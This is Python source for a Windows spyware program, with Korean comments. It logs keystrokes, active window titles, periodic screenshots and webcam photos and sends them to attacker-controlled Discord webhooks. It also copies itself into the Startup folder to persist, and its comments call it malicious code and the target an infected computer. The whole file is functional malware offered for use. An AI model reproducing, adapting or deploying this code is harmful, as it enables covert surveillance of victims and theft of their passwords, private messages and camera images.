from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Key,Listener
import threading
from chromepass import Chromepass
import win32gui
import getpass
import time
import os
import shutil
from pathlib import Path
import socket
import argparse
import cv2
import pyautogui
import requests
import base64

global keylog,lim,tab,crpass,filenameforexe,version,path,screenshot_delay,camshot_delay
keylog = ""
filenameforexe = "최종 .exe 파일 이름"
lim = 1970 #키로깅할때 몇자이상 타자를 쳤을 경우 키로그를 보낼지
LURL = "키로거내용을 받을 웹훅 링크"
LURL2 = "창 정보를 받을 웹훅 링크"
LURL3 = "기록(스크린샷,캠)을 받을 웹훅링크"
LNAME = getpass.getuser()
tab = "" #그냥 현재탭에 변화가있나를 확인할려고 만듦
path = "screenshot.jpg 및 camshot.jpg가 생성되어 불러와질 파일"
screenshot_delay = 10 #스크린샷 딜레이
camshot_delay = 10.25 #캠샷 딜레이

#웹훅에 메시지 보내기 (target = URL)
def send(message,target) -> None:
    sendall = DiscordWebhook(url=target, content=message, username=LNAME)
    sendall.execute()

#사진을 emb에 넣은후 메시지로 보네기 (image_file = path\screenshot.jpg,path\camshot.jpg)
def send_image_to_discord(image_file, url):
    try:
        webhook = DiscordWebhook(url=url)
        now = time.localtime()
        with open(f"{image_file}", "rb") as f:
            webhook.add_file(file=f.read(), filename=image_file)
        embed = DiscordEmbed(title=f"{LNAME}", description=f"{now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}", color='03b2f8')
        embed.set_thumbnail(url=f'attachment://{image_file}')
        webhook.add_embed(embed)
        webhook.execute()
    except:
        logging("ERROR | sending screenshot is Fail")

#로그기록을 보네기
def logging(message):
    now = time.localtime()
    message = f"{message} | {now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}"
    send(message,LURL3)
#키보드를 눌렀을 경우 함수
def on_press(Key):
    global keylog, lim
    try:
        if len(keylog) < lim:
            keylog = keylog + "." + str(Key).replace("'","")
        elif len(keylog) >= lim:
            send(keylog,LURL)
            logging("SUCCESS | KeyLogging is send")
            keylog = ""
    except:
        logging("ERROR | KeyLogging is Fail")

#키보드를 눌르면 이벤트가 발생되 on_press로 넘어감
def listener_c():
    with Listener(on_press=on_press) as listener:
        listener.join()

#시작프로그램 파일에 해당 악성코드를 넣어 시작할때마다 이파일을 실행시킴
def startup():
    global filenameforexe
    PATH = f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    end_PATH = str(Path.cwd()) + "\\" + filenameforexe
    if os.path.isdir(PATH):
        try:
            shutil.copy(end_PATH,PATH)
            logging(f"SUCCESS | copy_move {end_PATH} -> {PATH}" + "\\")
        except:
            logging(f"ERROR | copy_move {end_PATH} -> {PATH} is fail")
    else:
        logging(f"FAIL | copy_move {end_PATH} -> {PATH} is fail cause dir isn't there")

#사용중인창의 내용을 가져오는함수
def Tab():
    global tab
    try:
        if tab != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
            tab = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            send(tab,LURL2)
    except:
        logging("ERROR | TabLogging is Fail")

def whiling():
    while True:
        Tab()
        time.sleep(0.01)

#스크린샷을 찍고 웹훅으로 보넴
def screenshot():
    global path
    try:
        pyautogui.screenshot(f"{path}\\screenshot.jpg")
        send_image_to_discord(f"{path}\\screenshot.jpg",LURL3)
        os.remove(f"{path}\\screenshot.jpg")
    except:
        logging("ERROR | Get ScreenShot is Fail")

#캠을 찍고 웹훅으로 보넴
def camshoot():
    global path
    try:
        try:
            cap = cv2.VideoCapture(0)  # 캠을 카메라로 사용
        except:
            logging("ERROR | This Computer hasn't cam")
        cap.set(3, 640)  # 너비
        cap.set(4, 480)  # 높이
        ret, frame = cap.read()  # 사진 촬영
        frame = cv2.flip(frame, 1)  # 좌우 대칭
        cv2.imwrite(f"{path}\\camshoot.jpg", frame)  # 사진 저장
        cap.release()
        cv2.destroyAllWindows()
        send_image_to_discord(f"{path}\\camshoot.jpg",LURL3)
        os.remove(f"{path}\\camshoot.jpg")
    except:
        logging("ERROR | CamShoot is Fail")

#스크린샷을 10초마다 함
def listener_screenshot():
    global screenshot_delay
    while True:
        screenshot()
        time.sleep(screenshot_delay)

#캠샷을 10초마다함
def listener_camshot():
    global camshot_delay
    while True:
        camshoot()
        time.sleep(camshot_delay)

#감염 컴퓨터의 IP를 가져온다
def Get_IP():
    logging(f"Grabbing | {socket.gethostbyname(socket.gethostname())}")

def main():
    startup()
    Get_IP()
    threading.Thread(target=listener_c).start()
    threading.Thread(target=whiling).start()
    threading.Thread(target=listener_screenshot).start()
    threading.Thread(target=listener_camshot).start()

if __name__ == '__main__':
    main()
